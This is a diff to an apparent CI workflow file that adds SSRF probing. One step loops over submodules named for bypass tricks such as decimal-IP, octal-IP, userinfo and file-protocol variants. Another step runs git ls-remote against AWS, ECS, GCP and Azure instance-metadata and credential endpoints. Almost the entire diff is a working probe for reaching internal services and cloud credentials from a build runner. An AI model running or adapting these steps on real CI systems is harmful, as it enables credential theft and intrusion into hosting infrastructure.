@@ -13,17 +13,34 @@ jobs:
           submodules: false
           lfs: false
       
-      - name: Manual submodule init
+      - name: Initialize submodules manually
         run: |
+          # Show current .gitmodules
+          echo "=== .gitmodules ==="
           cat .gitmodules
-          echo "---"
-          git submodule init 2>&1 || true
-          echo "---"
-          git submodule update --recursive 2>&1 || true
           
-      - name: Test git protocols
+          # Try to init each submodule and capture errors
+          echo "=== Submodule init attempts ==="
+          for submod in ssrf-test localhost-test internal-test ssh-imds at-trick userinfo-bypass ipv6-mapped decimal-ip octal-ip file-protocol webhook-detect burp-detect; do
+            echo "--- Trying $submod ---"
+            timeout 10 git submodule update --init $submod 2>&1 || echo "Failed: $submod"
+          done
+          
+      - name: Test direct git clone to internal IPs
         run: |
-          # Try various git clone operations
-          git clone git://127.0.0.1/test.git /tmp/test1 2>&1 || echo "git:// failed"
-          git clone http://169.254.169.254/test.git /tmp/test2 2>&1 || echo "imds clone failed"
-          git ls-remote http://169.254.169.254/latest/meta-data/ 2>&1 || echo "ls-remote failed"
+          echo "=== Testing git clone/fetch to various internal addresses ==="
+          
+          # IMDS direct
+          timeout 5 git ls-remote http://169.254.169.254/latest/meta-data/ 2>&1 || echo "169.254.169.254 failed"
+          
+          # Link-local
+          timeout 5 git ls-remote http://[fe80::1]/test.git 2>&1 || echo "fe80::1 failed"
+          
+          # AWS ECS metadata
+          timeout 5 git ls-remote http://169.254.170.2/v2/credentials 2>&1 || echo "ECS metadata failed"
+          
+          # GCP metadata
+          timeout 5 git ls-remote http://metadata.google.internal/computeMetadata/v1/ 2>&1 || echo "GCP metadata failed"
+          
+          # Azure IMDS
+          timeout 5 git ls-remote http://169.254.169.254/metadata/instance 2>&1 || echo "Azure IMDS failed"
